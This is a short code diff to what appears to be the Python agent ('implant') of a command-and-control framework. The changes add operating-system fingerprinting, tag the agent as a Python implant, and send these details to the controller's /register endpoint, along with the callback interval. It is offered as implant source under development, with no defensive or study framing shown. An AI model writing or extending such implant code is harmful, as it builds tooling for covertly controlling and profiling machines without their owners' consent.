@@ -14,9 +14,11 @@ class Client:
             self.local_ip = subprocess.run("hostname -I | awk '{print $1}'", shell=True, capture_output=True, text=True).stdout.strip()
         else:
             self.local_ip = socket.gethostbyname(socket.gethostname())
+        self.os = platform.system()
+        self.implant_type = "Python"
 
     def register(self):
-        data = {'agent_id': self.local_ip}
+        data = {'agent_id': self.local_ip,"os": self.os, "implant_type": self.implant_type}
         req = requests.post(f"http://{self.server_ip}:{self.port}/register", json=data, timeout=10)
         if req.status_code not in [200, 201]:
             raise ValueError("Failed to register")
@@ -73,7 +75,7 @@ class Client:
                 #print(e)
 
 def main():
-    client = Client("localhost",callback_interval=15)
+    client = Client("127.0.0.1",callback_interval=15)
     client.run()
 
 if __name__ == '__main__':
